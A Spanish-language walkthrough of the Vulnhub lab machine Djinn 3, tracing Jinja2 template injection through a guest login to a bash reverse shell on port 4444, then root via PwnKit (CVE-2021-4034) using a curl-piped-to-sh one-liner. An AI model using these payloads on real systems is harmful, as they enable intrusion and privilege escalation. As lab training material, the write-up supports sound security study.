---
title: Djinn 3 - Vulnhub
layout: page
permalink: /writeups/vulnhub/djinn3
date: 2025-04-05 11:00:00 -0000
categories: [Laboratorios]
tags: [Vulnhub]
description: >
  Write up en español para Djinn 3 - Vulnhub
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -sS -Pn -T4 -O 192.168.100.96
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 11:23 CEST
Nmap scan report for 192.168.100.96
Host is up (0.00040s latency).
Not shown: 996 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
5000/tcp  open  upnp
31337/tcp open  Elite
MAC Address: BC:24:11:1B:C4:C8 (Proxmox Server Solutions GmbH)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
```

## Puerto 80

En este puerto vemos una página estática que nos informa que se trata de una startup que ofrece algún tipo de software para gestión de tickets y similares de forma personalizada.

![alt text](/assets/img/writeups/vulnhub/djinn3/image.png)

## Puerto 5000

En este puerto podemos intuir una aplicación python (por el número) y se trata de un panel para visualizar tickets que está en desarrollo.

![alt text](/assets/img/writeups/vulnhub/djinn3/image-1.png)

Si observamos las cabeceras de la página veremos como efectivamente es una app Flask en desarrollo (usa Werkzeug y Python 3.6.9).

![alt text](/assets/img/writeups/vulnhub/djinn3/image-2.png)

Si hacemos click en algún ticket vemos que hace uso de plantilla ya que carga el contenido de forma dinámica mediante un parametro GET `id` por URL.

![alt text](/assets/img/writeups/vulnhub/djinn3/image-3.png)

## Puerto 31337

En este puerto parece ejecutarse un servicio personalizado TCP que nos pide una autenticación para acceder a la aplicación.

![alt text](/assets/img/writeups/vulnhub/djinn3/image-4.png)

## Reconocimiento de usuarios

Si navegamos al servicio de visualización de tickets e investigamos los contenidos de los mismos podemos ver que indican ciertos pasos del mantemiento y creación de la aplciación.

1. Primera entrada

![alt text](/assets/img/writeups/vulnhub/djinn3/image-5.png)

El primer ticket indica que se ha implementado un sistema de autenticación basado en contraseñas y tokens para acceder al panel de administración de tickets.

2. Segunda entrada

![alt text](/assets/img/writeups/vulnhub/djinn3/image-6.png)

En la segunda entrada indica que se necesita eliminar el usuario `guest` y que deben implemtar una política de complejidad a las contraseñas.

3. Tercera entrada

![alt text](/assets/img/writeups/vulnhub/djinn3/image-7.png)

En esta entrada se indica que deben arreglar problemas en las peticiones postgres que se están utilizando, esto nos da información sobre el tipo de base de datos que está utilizando.

5. Quinta entrada

En la cuarta entrada se indica el relevo de un empleado en el diseño UI de la aplicación pero en la quinta parece ser que se han despedido o dimitido ciertos trabajadores cuyos nombres son expuestos e indica que tienen ciertos privilegios dentro del sistema.

![alt text](/assets/img/writeups/vulnhub/djinn3/image-8.png)

Este tipo de información puede ser útil más adelante.

## Explotación

Vamos a empezar probando en el sistema ofrecido por el puerto 31337 para ver si podemos acceder a la aplicación haciendo uso de el usuario `guest` y la contraseña `guest`, ya que aunque querían eliminarlo el ticket sigue en estado `open`.

![alt text](/assets/img/writeups/vulnhub/djinn3/image-9.png)

Una vez dentro solo podremos crear o eliminar tickets. Sabiendo que tenemos una aplicación bajo python y usa plantillas podemos intentar una inyección SSTI.

Vamos a crear un nuevo ticket donde vamos a probar una inyección SSTI para jinja2.

![alt text](/assets/img/writeups/vulnhub/djinn3/image-10.png)

![alt text](/assets/img/writeups/vulnhub/djinn3/image-11.png)

![alt text](/assets/img/writeups/vulnhub/djinn3/image-12.png)

En ambos campos tenemos una inyección SSTI.

Vamos a aprovechar esto como punto de entrada para obtener una shell.

{% raw %}
```plaintext
{{ config.__class__.__init__.__globals__['os'].popen("nohup bash -c 'bash -i >& /dev/tcp/192.168.100.210/4444 0>&1'") }}
```
{% endraw %}

![alt text](/assets/img/writeups/vulnhub/djinn3/image-13.png)

Ponemos en escucha el puerto 4444 y hacemos que cargue la plantilla.

```bash
nc -nlvp 4444
```

![alt text](/assets/img/writeups/vulnhub/djinn3/image-14.png)

![alt text](/assets/img/writeups/vulnhub/djinn3/image-15.png)

## Explorando el sistema

Ahora podemos estabilizar la shell y explorar el sistema.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
CRTL+Z
stty raw -echo ; fg
ENTER
export TERM=xterm
```

![alt text](/assets/img/writeups/vulnhub/djinn3/image-16.png)

Aqui vemos que el contenido de la tabla de tickets es un json y podemos ver también el codigo fuente de la aplicación flask.

{% raw %}
```python
www-data@djinn3:/opt/.web$ cat webapp.py
from flask import Flask, render_template, request, render_template_string
import json


app = Flask(__name__, static_url_path="/static")
app.secret_key = "hackthedamnplanet"


@app.route("/")
def index():
    try:
        ticket_id = request.args.get("id")
    except:
        ticket_id = None

    with open("data.json", "r") as f:
        data = json.load(f)

    if ticket_id:
        for d in data:
            if d["id"] == int(ticket_id):
                title = d["title"]
                status = d["status"]
                desc = d["desc"]

        template = """
        <html>
            <head>
            </head>

            <body>
                <h4>%s</h4>
                <br>
                <b>Status</b>: %s
                <br>
                <b>ID</b>: %s
                <br>
                <h4> Description: </h4>
                <br>
                %s
            </body>
             <footer>
              <p><strong>Sorry for the bright page, we are working on some beautiful CSS</strong></p>
             </footer>
        </html>
        """ % (
            title,
            status,
            ticket_id,
            desc,
        )
        return render_template_string(template)
    else:
        return render_template("index.html", items=data)


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=False)

```
{% endraw %}

**Hardcoded Secret Key**
```python
app.secret_key = "hackthedamnplanet"
```

Esta es la clave secreta de Flask, usada para firmar cookies de sesión (`flask.session`).

Haciendo una revisión de los usuarios del sistema vemos tres usuarios potencialmente interesantes.

![alt text](/assets/img/writeups/vulnhub/djinn3/image-17.png)

Navegando por el sistema encontramos también el código fuente de la aplicación de tickets.

![alt text](/assets/img/writeups/vulnhub/djinn3/image-18.png)

Seguimos explorando y tras intentar el clásico `sudo -l` vemos que nos pide las credenciales del usuario www-data así no podemos hacer nada por lo que vamos a ver binarios con SUID activo.

```bash
find / -perm -4000 -type f 2>/dev/null
```

![alt text](/assets/img/writeups/vulnhub/djinn3/image-19.png)

La lista de SUIDs que diste parece bastante estándar… **casi todo lo que ves está en instalaciones típicas de Linux**, **excepto uno potencialmente interesante**.

- Potencial vector: `**/usr/bin/pkexec**`

`pkexec` ha sido explotable varias veces, y en algunos entornos puede llevar a **escalada local a root**. El más famoso fue:

**CVE-2021-4034** — PwnKit

Permite escalar de cualquier usuario a root si:
- El sistema es vulnerable
- No se ha parcheado `pkexec`
- Estás en un entorno compatible (Debian/Ubuntu con ciertos setups)

Para comprobar si es vulnerable:

```bash
pkexec --version
```

Lo que nos muestra que si es vulnerable a [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034)

Podemos encontrar el exploit en [Github](https://github.com/ly4k/PwnKit)

### **¿Qué es Polkit y pkexec?**
- **Polkit** (antes PolicyKit) es un sistema para manejar **privilegios a nivel de sistema**.
- `pkexec` es como un `sudo` gráfico/alternativo: permite ejecutar comandos con permisos elevados, respetando políticas del sistema.
- Lo importante: `pkexec` es un binario **SUID-root**, o sea, siempre se ejecuta como root incluso si lo llama un usuario sin privilegios.

### ¿Qué es la vulnerabilidad PwnKit (CVE-2021-4034)?

> Es un fallo **en cómo `pkexec` maneja argumentos y variables de entorno**. Y lo peor: existe desde **2009** y afecta **casi todas las distros Linux** 

1. Si ejecutas `pkexec` **sin argumentos**, se produce un error lógico: intenta leer `argv[1]`, pero no hay argumentos.
2. El valor que intenta leer (fuera de límites) **termina apuntando a `envp[0]`**, es decir, **a una variable de entorno**.
3. Luego esa variable se **reinterpreta como un nombre de binario a ejecutar**.
4. Y por último, `pkexec` hace una **escritura fuera de límites** (overwrite) en esa misma variable.

Esto permite a un atacante **inyectar una variable de entorno maliciosa** (por ejemplo `LD_PRELOAD`), que normalmente sería eliminada por seguridad.  
Una vez cargado ese preload → se ejecuta **código arbitrario como root**.

### Impacto real
> **"Root en 1 segundo desde cualquier usuario sin privilegios"**

- No necesita escribir en archivos del sistema
- No requiere sudo
- No requiere ningún usuario en especial
- Es **silencioso** y no deja logs evidentes

## Escalada de privilegios

Como en este caso nuestra máquina cuenta con conexión a internet podemos ejecutar el oneliner que nos proporciona el exploit, pero si no fuese el caso siempre podríamos descargarlo en nuestra maquina y pasarlo a través un servidor web python.

```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

![alt text](/assets/img/writeups/vulnhub/djinn3/image-20.png)


